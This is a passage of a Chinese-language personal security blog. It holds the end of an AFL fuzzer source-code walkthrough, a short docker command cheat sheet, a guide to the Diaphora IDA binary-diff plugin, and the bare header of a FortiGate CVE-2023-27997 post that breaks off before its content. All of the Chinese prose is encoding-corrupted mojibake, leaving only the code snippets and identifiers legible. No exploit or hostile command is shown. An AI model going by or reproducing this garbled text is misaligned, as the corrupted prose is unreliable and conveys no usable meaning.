class="built_in">queue</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>è°ƒç”¨show_statsï¼Œåˆ·æ–°ç•Œé¢ã€‚</p>
</li>
</ul>
</li>
<li><p>æ‰§è¡Œ**skipped_fuzz &#x3D; fuzz_one(use_argv)**ã€‚</p>
</li>
</ul>
<h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h2><p>ä»queueä¸­å–å‡ºentryè¿›è¡Œfuzzï¼ŒæˆåŠŸè¿”å›0ï¼Œå¦åˆ™è¿”å›1ã€‚</p>
<ul>
<li>å¦‚æœ<strong>pending_favored</strong>é0ï¼Œå¹¶ä¸”å½“å‰queueå·²ç»è¢«fuzzè¿‡ï¼Œå¹¶ä¸”queue_cur-&gt;favored&#x3D;&#x3D;0ï¼Œåˆ™æœ‰99%çš„æ¦‚ç‡ç›´æ¥è¿”å›1ã€‚</li>
<li>å¦‚æœ<strong>pending_favored</strong>ä¸º0ï¼Œå¹¶ä¸”ä¸æ˜¯dumb modeï¼Œå¹¶ä¸”queue_cur-&gt;favored&#x3D;&#x3D;0ï¼Œqueued_paths &gt; 10ã€‚<ul>
<li>å¦‚æœqueue_cycle &gt; 1ï¼Œå¹¶ä¸”queueæ²¡æœ‰è¢«fuzzè¿‡ï¼Œåˆ™æœ‰75%çš„æ¦‚ç‡ç›´æ¥è¿”å›1ã€‚</li>
<li>å¦‚æœqueueå·²ç»è¢«fuzzè¿‡ï¼Œåˆ™æœ‰95%çš„æ¦‚ç‡ç›´æ¥è¿”å›1ã€‚</li>
</ul>
</li>
<li>æ‰“å¼€æµ‹è¯•æ ·ä¾‹æ–‡ä»¶ï¼Œå¹¶ä¸”è®¾ç½®len &#x3D; queue_cur-&gt;lenï¼Œå°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œåœ°å€å¤åˆ¶ç»™orig_inï¼Œin_bufã€‚</li>
</ul>
<p><strong>CALIBRATIONé˜¶æ®µ</strong></p>
<ul>
<li>å¦‚æœqueue_cur-&gt;cal_failedå­˜åœ¨ï¼Œå¹¶ä¸”queue_cur-&gt;cal_failed&lt;3ï¼Œåˆ™å†æ¬¡è°ƒç”¨calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1, 0)ã€‚</li>
</ul>
<p><strong>TRIMMINGé˜¶æ®µ</strong></p>
<ul>
<li><p>å¦‚æœä¸æ˜¯dumb modeï¼Œå¹¶ä¸”queueæ²¡æœ‰è¢«ä¿®å‰ªè¿‡ï¼Œåˆ™è°ƒç”¨**trim_case(argv, queue_cur, in_buf)**ã€‚</p>
</li>
<li><p>len &#x3D; queue_cur-&gt;lenï¼Œè°ƒç”¨memcpy(out_buf, in_buf, len)ã€‚</p>
</li>
</ul>
<p><strong>PERFORMANCE SCORE</strong>é˜¶æ®µ</p>
<ul>
<li>perf_score &#x3D; calculate_score(queue_cur)ã€‚</li>
<li>å¦‚æœskip_deterministicå­˜åœ¨ï¼Œæˆ–è€…queueå·²ç»è¢«fuzzè¿‡ï¼Œæˆ–è€…queue_cur-&gt;passed_detå­˜åœ¨ï¼Œåˆ™è·³è½¬å»havoc_stageã€‚</li>
</ul>
<p><strong>SIMPLE BITFLIP</strong>é˜¶æ®µ</p>
<p>bitç¿»è½¬ç­–ç•¥ã€‚</p>
<ul>
<li><p>å®šä¹‰äº†å¦‚ä¸‹å®ï¼Œè¿™ä¸ªå®çš„ä½œç”¨æ˜¯ï¼Œç¿»è½¬_arçš„(_bf) &gt;&gt; 3åç§»å¤„å­—èŠ‚çš„ï¼Œç¬¬7-((_bf) &amp; 7)æ¯”ç‰¹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line"><span class="meta">    u8* _arf = (u8*)(_ar); \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b); \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>bitflip 1&#x2F;1</strong>é˜¶æ®µï¼Œé€æ­¥ç¿»è½¬æ¯ä¸€ä¸ªå­—èŠ‚çš„æ¯ä¸€æ¯”ç‰¹ï¼Œå¹¶ä¸”è°ƒç”¨common_fuzz_stuff(argv, out_buf, len)ï¼Œä¹‹åä¼šæ¢å¤è¿™ä¸ªæ¯”ç‰¹ã€‚</p>
</li>
<li><p>å¹¶ä¸”å¦‚æœåœ¨<strong>bitflip 1&#x2F;1</strong>é˜¶æ®µï¼Œè¿ç»­ç¿»è½¬å‡ ä¸ªå­—èŠ‚æ—¶ï¼Œè·¯å¾„è¦†ç›–ä¸åŸè·¯å¾„ä¸ä¸€æ ·ï¼Œå¹¶ä¸”è¿™å‡ ä¸ªæ–°è¦†ç›–çš„è·¯å¾„ä¸€æ ·ï¼Œåˆ™AFLçŒœæµ‹è¿™å‡ ä¸ªå­—èŠ‚ä¸ºtokenï¼Œå¹¶è°ƒç”¨maybe_add_auto(a_collect, a_len)ã€‚</p>
</li>
<li><p><strong>bitflip 2&#x2F;1</strong>é˜¶æ®µï¼Œè¿ç»­ç¿»è½¬2bitã€‚</p>
</li>
<li><p><strong>bitflip 4&#x2F;1</strong>é˜¶æ®µï¼Œè¿ç»­ç¿»è½¬4bitã€‚</p>
</li>
<li><p>ç”Ÿæˆ<strong>Effector map</strong>ã€‚è¿™ä¸ªç»“æ„çš„ä½œç”¨æ˜¯ä½¿å¾—AFLå¯¹æ–‡ä»¶æ ¼å¼æœ‰ä¸€å®šçš„åˆ¤æ–­ï¼Œä»è€Œæé«˜æ•ˆç‡ã€‚å¦‚æœå°†æŸä¸ªå­—èŠ‚å®Œå…¨åè½¬ï¼Œä¹Ÿä¸èƒ½å¯¼è‡´è·¯å¾„å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—èŠ‚å¯èƒ½å°±æ˜¯<strong>data</strong>ï¼Œå¯¹fuzzæ¥è¯´æ„ä¹‰ä¸å¤§ï¼Œåœ¨<strong>Effector map</strong>ä¸­æ ‡è®°ä¸º0ï¼Œè¡¨ç¤ºè¯¥å­—èŠ‚æ— æ•ˆï¼Œåœ¨ä»¥åå˜å¼‚ä¸­è·³è¿‡è¿™äº›å­—èŠ‚ï¼Œä»¥èŠ‚çœèµ„æºã€‚</p>
</li>
<li><p><strong>bitflip 8&#x2F;8</strong>é˜¶æ®µï¼Œä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¿»è½¬ã€‚åœ¨æ»¡è¶³ä¸æ˜¯dumb modeå’Œlen &gt;&#x3D; 128çš„æ¡ä»¶ä¸‹ï¼Œè®¡ç®—cksumï¼Œå¦‚æœcksum !&#x3D; queue_cur-&gt;exec_cksumï¼Œé‚£ä¹ˆæ ‡è®°<strong>eff_map[EFF_APOS(stage_cur)] &#x3D; 1</strong>ï¼Œå³ä»£è¡¨è¿™ä¸ªå­—èŠ‚å€¼å¾—å˜å¼‚ã€‚</p>
</li>
<li><p><strong>bitflip 16&#x2F;8</strong>é˜¶æ®µï¼Œä»¥2å­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¿»è½¬ï¼Œä½†æ˜¯ä¼šè·³è¿‡eff_map[EFF_APOS(stage_cur)]ä¸º0çš„å­—èŠ‚ã€‚</p>
</li>
<li><p><strong>bitflip 32&#x2F;8</strong>é˜¶æ®µï¼Œä»¥2å­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¿»è½¬ï¼ŒåŒæ ·ä¼šè·³è¿‡eff_map[EFF_APOS(stage_cur)]ä¸º0çš„å­—èŠ‚ã€‚</p>
</li>
</ul>
<p><strong>ARITHMETIC INC&#x2F;DEC</strong>é˜¶æ®µ</p>
<p>byteåŠ å‡æ³•ç­–ç•¥ã€‚</p>
<ul>
<li><strong>arith 8&#x2F;8</strong>é˜¶æ®µï¼Œæ¯8ä¸ªbitï¼Œè¿›è¡ŒåŠ å‡è¿ç®—ã€‚</li>
<li><strong>arith 16&#x2F;8</strong>é˜¶æ®µï¼Œæ¯16ä¸ªbitï¼Œè¿›è¡ŒåŠ å‡è¿ç®—ã€‚</li>
<li><strong>arith 32&#x2F;8</strong>é˜¶æ®µï¼Œæ¯32ä¸ªbitï¼Œè¿›è¡ŒåŠ å‡è¿ç®—ã€‚</li>
<li>ä¼šè·³è¿‡è¢«eff_mapè®¤ä¸ºæ— æ•ˆçš„å­—æ®µï¼Œä»¥åŠè·³è¿‡è¢«å˜å¼‚è¿‡çš„æµ‹è¯•æ ·ä¾‹ã€‚</li>
</ul>
<p><strong>INTERESTING VALUES</strong>é˜¶æ®µ</p>
<p>byteæ›¿æ¢ç­–ç•¥ã€‚</p>
<ul>
<li><strong>interest 8&#x2F;8</strong>ï¼Œæ¯8ä¸ªbitè¿›è¡Œæ›¿æ¢ã€‚</li>
<li><strong>interest 16&#x2F;8</strong>ï¼Œæ¯16ä¸ªbitè¿›è¡Œæ›¿æ¢ã€‚</li>
<li><strong>interest 32&#x2F;8</strong>ï¼Œæ¯32ä¸ªbitè¿›è¡Œæ›¿æ¢ã€‚</li>
<li>ä¼šè·³è¿‡è¢«eff_mapè®¤ä¸ºæ— æ•ˆçš„å­—æ®µï¼Œä»¥åŠè·³è¿‡è¢«å˜å¼‚è¿‡çš„æµ‹è¯•æ ·ä¾‹ã€‚</li>
</ul>
<p><strong>DICTIONARY STUFF</strong>é˜¶æ®µ</p>
<p>æ›¿æ¢æˆ–æ’å…¥tokensã€‚</p>
<p><strong>RANDOM HAVOC</strong>é˜¶æ®µ</p>
<p>dumb fuzzï¼Œå®Œå…¨éšæœºçš„å˜å¼‚ã€‚</p>
<h2 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h2><p>è¯»å–å…¶ä»–fuzzerçš„æµ‹è¯•æ ·ä¾‹ï¼Œå¹¶è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœå‡ºç°æ–°è·¯å¾„ï¼Œå°±ä¿å­˜åˆ°è‡ªå·±çš„queueæ–‡ä»¶å¤¹é‡Œã€‚</p>
<h2 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h2><p>ä¿®å‰ªæµ‹è¯•æ ·ä¾‹ã€‚</p>
<ul>
<li><p>å¦‚æœæµ‹è¯•æ ·ä¾‹å°äº5ï¼Œåˆ™ç›´æ¥è¿”å›ã€‚</p>
</li>
<li><p>è®¡ç®—len_p2ï¼Œlen_p2 &#x3D; next_p2(q-&gt;len)ï¼Œremove_len&#x3D;1&#x2F;16 * len_p2 ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u32 <span class="title function_">next_p2</span><span class="params">(u32 val)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u32 ret = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (val &gt; ret) ret &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿›å…¥å¾ªç¯ï¼Œå¾ªç¯è·³å‡ºæ¡ä»¶æ˜¯remove_len&lt; 1&#x2F;1024 * len_p2ã€‚</p>
<ul>
<li>è·³è¿‡in_bufä»remove_posåç§»å¤„çš„trim_availå­—èŠ‚ï¼Œå†™å…¥åˆ°.cur_inputä¸­ã€‚</li>
<li>è°ƒç”¨**fault &#x3D; run_target(argv, exec_tmout)**ï¼Œcksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST)ã€‚</li>
<li>å¦‚æœcksum &#x3D;&#x3D; q-&gt;exec_cksumï¼Œå°±æŠŠåŸæœ¬æµ‹è¯•æ ·ä¾‹ä¸­å°‘å»çš„è¿™æ®µç»™åˆ é™¤ï¼Œå®ç°äº†æµ‹è¯•æ ·ä¾‹çš„ç®€åŒ–ã€‚</li>
<li>å¦åˆ™remove_pos +&#x3D; remove_lenã€‚</li>
<li>show_statsï¼ˆï¼‰</li>
</ul>
</li>
<li><p>å¦‚æœneeds_writeå­˜åœ¨ï¼Œåˆ™åˆ é™¤åŸæµ‹è¯•æ ·ä¾‹ï¼Œå°†ç®€åŒ–åçš„æµ‹è¯•æ ·ä¾‹å†™åˆ°åŒåæ–‡ä»¶ä¸­ã€‚</p>
</li>
<li><p>è¿”å›faultã€‚</p>
</li>
</ul>
<h2 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score"></a>calculate_score</h2><p>æ ¹æ®é€Ÿåº¦ï¼Œè¦†ç›–è·¯å¾„æ•°ï¼Œè·¯å¾„æ·±åº¦è®¡ç®—å‡ºä¸€ä¸ªå¾—åˆ†ï¼Œhavocå˜å¼‚é˜¶æ®µç”¨ã€‚</p>
<h2 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h2><p>å†™æµ‹è¯•æ ·ä¾‹è¿›æ–‡ä»¶å¹¶è¿›è¡Œæµ‹è¯•ã€‚</p>
<ul>
<li>å¦‚æœ<strong>post_handler</strong>å­˜åœ¨ï¼Œåˆ™å…ˆæ‰§è¡Œout_buf &#x3D; post_handler(out_buf, &amp;len)ï¼Œå¯¹æµ‹è¯•æ ·ä¾‹è¿›è¡Œå¤„ç†ã€‚</li>
<li>è°ƒç”¨write_to_testcase(out_buf, len)ï¼Œå†™å…¥.cur_inputã€‚</li>
<li>è°ƒç”¨fault &#x3D; run_target(argv, exec_tmout)ã€‚</li>
<li>å¦‚æœfault &#x3D;&#x3D; FAULT_TMOUTï¼Œè¿”å›1ã€‚</li>
<li>è°ƒç”¨queued_discovered +&#x3D; save_if_interesting(argv, out_buf, len, fault)ã€‚</li>
<li>show_stats()ã€‚</li>
<li>è¿”å›0ã€‚</li>
</ul>
<h2 id="write-to-testcase"><a href="#write-to-testcase" class="headerlink" title="write_to_testcase"></a>write_to_testcase</h2><p>ä»memå†™lenåˆ°.cur_inputä¸­ã€‚</p>
<h2 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h2><p>å¦‚æœè¿™ä¸ªæµ‹è¯•æ ·ä¾‹å¾ˆæœ‰è¶£å°±ä¿å­˜ä¸‹æ¥ï¼Œä¿å­˜å°±è¿”å›1ï¼Œå¦åˆ™è¿”å›0.</p>
<ul>
<li>å¦‚æœfault &#x3D;&#x3D; crash_modeï¼Œä½†æ˜¯æ²¡æœ‰å‡ºç°æ–°è·¯å¾„å¹¶ä¸”è·¯å¾„å‘½ä¸­æ¬¡æ•°ç›¸åŒï¼Œåˆ™ç›´æ¥è¿”å›0.</li>
<li>è°ƒç”¨add_to_queue(fn, len, 0)ï¼Œæ·»åŠ æ–°æµ‹è¯•æ ·ä¾‹åˆ°é˜Ÿåˆ—ä¸­ã€‚</li>
<li>è°ƒç”¨queue_top-&gt;exec_cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST)ã€‚</li>
<li>è°ƒç”¨calibrate_case(argv, queue_top, mem, queue_cycle - 1, 0)è¯„ä¼°queueã€‚</li>
<li>æ ¹æ®faultçš„å€¼è¿›è¡Œä¸åŒå¤„ç†ã€‚</li>
</ul>
<h2 id="simplify-trace"><a href="#simplify-trace" class="headerlink" title="simplify_trace"></a>simplify_trace</h2><ul>
<li><p>8å­—èŠ‚ä¸€ç»„ï¼Œéå†trace_bitsã€‚</p>
<ul>
<li><p>å¦‚æœmemä¸ä¸ºç©ºï¼Œmem8[i] &#x3D; simplify_lookup[mem8[i]]ã€‚</p>
</li>
<li><p>å¦åˆ™*mem &#x3D; 0x0101010101010101ULLï¼Œå³ä»£è¡¨è¿™8ä¸ªè·¯å¾„éƒ½æ²¡æœ‰å‘½ä¸­ã€‚</p>
</li>
</ul>
</li>
</ul>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a target="_blank" rel="noopener" href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#simplify-trace">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#simplify-trace</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2092">https://forum.butian.net/share/2092</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/12/02/docker%E5%B0%8F%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/02/docker%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">dockerå°è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-02 23:11:13 / Modified: 23:36:59" itemprop="dateCreated datePublished" datetime="2023-12-02T23:11:13+08:00">2023-12-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>é›¶é›¶æ•£æ•£ç”¨è¿‡å‡ æ¬¡<strong>docker</strong>ï¼Œä¸è¿‡ç”±äºä½¿ç”¨æ¬¡æ•°å°‘ï¼Œæ‰€ä»¥ç»å¸¸ä¼šå¿˜è®°å®ƒçš„å‘½ä»¤ï¼Œè¿™æ¬¡ç³»ç»Ÿåœ°æ•´ç†å¹¶è®°å½•ä¸€ä¸‹å¸¸ç”¨çš„æŒ‡ä»¤ã€‚</p>
<h2 id="é•œåƒç›¸å…³"><a href="#é•œåƒç›¸å…³" class="headerlink" title="é•œåƒç›¸å…³"></a>é•œåƒç›¸å…³</h2><h3 id="æŸ¥çœ‹é•œåƒ"><a href="#æŸ¥çœ‹é•œåƒ" class="headerlink" title="æŸ¥çœ‹é•œåƒ"></a>æŸ¥çœ‹é•œåƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>

<h3 id="æ‹‰å–é•œåƒ"><a href="#æ‹‰å–é•œåƒ" class="headerlink" title="æ‹‰å–é•œåƒ"></a>æ‹‰å–é•œåƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>

<h3 id="åˆ é™¤é•œåƒ"><a href="#åˆ é™¤é•œåƒ" class="headerlink" title="åˆ é™¤é•œåƒ"></a>åˆ é™¤é•œåƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>

<h2 id="å®¹å™¨ç›¸å…³"><a href="#å®¹å™¨ç›¸å…³" class="headerlink" title="å®¹å™¨ç›¸å…³"></a>å®¹å™¨ç›¸å…³</h2><h3 id="åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨"><a href="#åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨" class="headerlink" title="åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨"></a>åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name=&quot;xxx&quot; -v /local_path:/docker_path image_id /bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="å¯åŠ¨-åœæ­¢å®¹å™¨"><a href="#å¯åŠ¨-åœæ­¢å®¹å™¨" class="headerlink" title="å¯åŠ¨&#x2F;åœæ­¢å®¹å™¨"></a>å¯åŠ¨&#x2F;åœæ­¢å®¹å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start/stop container_id</span><br></pre></td></tr></table></figure>

<h3 id="åˆ é™¤å®¹å™¨"><a href="#åˆ é™¤å®¹å™¨" class="headerlink" title="åˆ é™¤å®¹å™¨"></a>åˆ é™¤å®¹å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm container_id</span><br></pre></td></tr></table></figure>

<h3 id="è¿›å…¥å®¹å™¨"><a href="#è¿›å…¥å®¹å™¨" class="headerlink" title="è¿›å…¥å®¹å™¨"></a>è¿›å…¥å®¹å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it container_id /bin/sh</span><br></pre></td></tr></table></figure>

<h2 id="Docker-é•œåƒåˆ¶ä½œ"><a href="#Docker-é•œåƒåˆ¶ä½œ" class="headerlink" title="Docker é•œåƒåˆ¶ä½œ"></a>Docker é•œåƒåˆ¶ä½œ</h2><h3 id="å®¹å™¨è½¬ä¸ºé•œåƒ"><a href="#å®¹å™¨è½¬ä¸ºé•œåƒ" class="headerlink" title="å®¹å™¨è½¬ä¸ºé•œåƒ"></a>å®¹å™¨è½¬ä¸ºé•œåƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit container_id image_name:version</span><br></pre></td></tr></table></figure>

<h2 id="ç¼–è¾‘æ–‡ä»¶"><a href="#ç¼–è¾‘æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘æ–‡ä»¶"></a>ç¼–è¾‘æ–‡ä»¶</h2><p><strong>Vscode</strong>ä¸‹è½½<strong>Remote-ssh</strong>å’Œ<strong>Docker</strong>æ’ä»¶ï¼Œä¹‹åå°±å¯ä»¥è¿œç¨‹è¿ä¸Šå»è¿›è¡Œç¼–è¾‘ã€‚</p>
<p><img src="/img/docker%E5%B0%8F%E8%AE%B0/1.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/11/20/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/20/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">IDA-diffæ’ä»¶-diaphoraä½¿ç”¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-20 09:32:15" itemprop="dateCreated datePublished" datetime="2023-11-20T09:32:15+08:00">2023-11-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-02 23:36:41" itemprop="dateModified" datetime="2023-12-02T23:36:41+08:00">2023-12-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>å‰å‡ å¤©æ‰“äº†<strong>datacon</strong>ï¼Œéœ€è¦å¯»æ‰¾åŸ‹åœ¨äºŒè¿›åˆ¶æ–‡ä»¶é‡Œçš„æ¼æ´ã€‚ä¸€ç§ä¸é”™çš„æ–¹å¼æ˜¯æ‰¾ä¸¤ä¸ªç‰ˆæœ¬é è¿‘äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œ<strong>diff</strong>ä¸€ä¸‹ã€‚ä¹‹å‰ç¬”è€…éƒ½æ˜¯é€šè¿‡<strong>bindiff+ghidra</strong>æ¥è¿›è¡Œ<strong>diff</strong>äºŒè¿›åˆ¶æ–‡ä»¶çš„ï¼Œå¯¹äºçœ‹ä¹ æƒ¯äº†<strong>IDA</strong>ç•Œé¢çš„æˆ‘è€Œè¨€ï¼Œæ€»æ„Ÿè§‰<strong>ghidra</strong>ç•Œé¢çœ‹èµ·æ¥ä¸å¤Ÿèˆ’æœã€‚äºæ˜¯æ‰¾åˆ°äº†<strong>diaphora</strong>è¿™ä¸ª<strong>IDA</strong>çš„æ’ä»¶ï¼ˆé¡¹ç›®åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/joxeankoret/diaphora">https://github.com/joxeankoret/diaphora</a> ï¼‰ï¼Œä¸“é—¨ç”¨æ¥å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œ<strong>diff</strong>ï¼Œä½¿ç”¨èµ·æ¥ä¹Ÿæä¸ºç®€å•ä¾¿æ·ã€‚è¿™è¿™é‡Œè®°å½•ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•ã€‚</p>
<p>é¦–å…ˆç”¨<strong>IDA</strong>æ‰“å¼€ç¬¬ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒFile-&gt;Script fileé‡Œé€‰æ‹©<strong>diaphora.py</strong>ã€‚å¼¹å‡º<strong>Diaphora</strong>ç•Œé¢åç›´æ¥ç‚¹å‡»OKï¼ŒæŠŠç¬¬ä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®å¯¼å…¥æ•°æ®åº“ä¸­ï¼Œè®°ä½sqliteçš„ä½ç½®ã€‚ç­‰å¾…<strong>Diaphora</strong>è¿è¡Œå®Œæ¯•ä¹‹åï¼Œå³å¯å…³é—­ç¬¬ä¸€ä¸ªIDAç•Œé¢ã€‚</p>
<p><img src="/img/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/1.png"></p>
<p>ç„¶åç”¨<strong>IDA</strong>æ‰“å¼€ç¬¬äºŒä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨åŒæ ·çš„æ–¹å¼è¿è¡Œ<strong>diaphora.py</strong>ä¹‹åï¼ŒæŠŠåˆšæ‰ç”Ÿæˆçš„sqliteçš„è·¯å¾„å¡«åˆ°ï¼Œ<strong>SQLite database to diff against</strong>ä¸­ï¼Œå†ç‚¹å‡»OKè¿è¡Œã€‚</p>
<p><img src="/img/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/2.png"></p>
<p>è¿è¡Œå®Œæˆä¹‹åå³å¯çœ‹åˆ°<strong>diff</strong>çš„ç»“æœï¼Œçœ‹èµ·æ¥å¾ˆèˆ’æœã€‚</p>
<p><img src="/img/IDA-diff%E6%8F%92%E4%BB%B6-diaphora%E4%BD%BF%E7%94%A8/3.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/11/06/CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/06/CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow/" class="post-title-link" itemprop="url">CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-06 14:22:07" itemprop="dateCreated datePublished" datetime="2023-11-06T14:22:07+08:00">2023-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
